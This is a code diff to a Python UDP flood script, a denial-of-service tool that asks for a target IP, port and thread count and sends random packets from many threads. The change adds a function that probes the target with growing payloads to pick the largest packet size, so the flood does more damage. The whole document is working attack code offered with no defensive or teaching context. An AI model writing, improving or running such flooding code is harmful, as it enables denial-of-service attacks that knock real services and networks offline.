@@ -4,6 +4,24 @@ import threading
 import os
 import time
 
+def detect_max_udp_payload(ip, port, max_limit=65507):
+    """
+    Try sending increasing payload sizes until it fails.
+    65507 bytes is the theoretical max payload size for UDP.
+    """
+    test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    print(f"Probing {ip}:{port} for max UDP payload...")
+    for size in range(512, max_limit + 1, 512):
+        try:
+            test_sock.sendto(random._urandom(size), (ip, port))
+        except OSError as e:
+            print(f"Max packet size before failure: {size - 512} bytes")
+            test_sock.close()
+            return size - 512
+    test_sock.close()
+    print(f"Max safe size detected: {max_limit} bytes")
+    return max_limit
+
 def udp_flood(ip: str, port: int, packet_size: int, thread_id: int):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet = random._urandom(packet_size)
@@ -22,10 +40,11 @@ def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     ip = input("Target IP: ").strip()
     port = int(input("Target Port: ").strip())
-    packet_size = int(input("Packet Size (e.g., 1024-65500): ").strip())
     thread_count = int(input("Number of Threads (e.g., 10-500): ").strip())
 
-    print(f"\nStarting flood on {ip}:{port} with {thread_count} threads...\n")
+    # Detect max payload
+    packet_size = detect_max_udp_payload(ip, port)
+    print(f"Using packet size: {packet_size} bytes\n")
     time.sleep(1)
 
     threads = []
@@ -35,7 +54,6 @@ def main():
             t.start()
             threads.append(t)
 
-        # Keep main thread alive
         while True:
             time.sleep(1)
 
